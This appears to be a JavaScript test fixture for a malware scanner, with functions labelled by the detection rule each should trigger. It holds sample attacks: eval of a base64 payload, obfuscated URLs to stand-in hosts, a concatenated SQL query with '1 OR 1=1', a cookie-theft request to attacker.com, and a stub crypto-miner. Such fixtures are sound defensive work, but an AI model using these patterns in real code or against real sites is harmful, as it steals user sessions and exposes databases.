/**
 * This is a demonstration file with intentionally malicious JavaScript code.
 * DO NOT USE THIS IN PRODUCTION - FOR TESTING ONLY
 */

// Base64 encoded payload execution (should trigger JS-EVAL-BASE64)
function decodeAndExecute() {
    const encodedPayload = "Y29uc29sZS5sb2coIkhhY2tlZCIpOw=="; // console.log("Hacked");
    eval(window.atob(encodedPayload));
}

// Obfuscated URL (should trigger JS-OBFUSCATED-URL)
function loadMaliciousScript() {
    const protocol = "h" + "t" + "t" + "p";
    const secure = "s";
    const domain = "malicious-domain.com";
    const url = protocol + secure + "://" + domain + "/evil.js";
    
    // Alternative obfuscation
    const evilUrl = "\x68\x74\x74\x70\x73" + "://evil-site.xyz/payload.js";
    
    return [url, evilUrl];
}

// SQL Injection vulnerability (should trigger SQL-INJECTION-VULN)
function queryDatabase(userId) {
    const query = "SELECT * FROM users WHERE id = " + userId + " LIMIT 1";
    return query;
}

// XSS Cookie theft (should trigger XSS-COOKIE-THEFT)
function stealCookies() {
    const img = new Image();
    img.src = "https://attacker.com/steal?cookie=" + document.cookie;
    document.body.appendChild(img);
}

// Cryptocurrency miner (should trigger CRYPTO-MINER)
function initMiner() {
    console.log("Starting CryptoNight miner...");
    const miner = {
        start: function() {
            console.log("Mining started");
            connectToPool("stratum+tcp://mining-pool.com:3333");
        }
    };
    miner.start();
}

// Main function that calls all the malicious functions
function executePayload() {
    decodeAndExecute();
    loadMaliciousScript();
    queryDatabase("1 OR 1=1");
    stealCookies();
    initMiner();
}

// This would be executed when the script is loaded
// executePayload(); 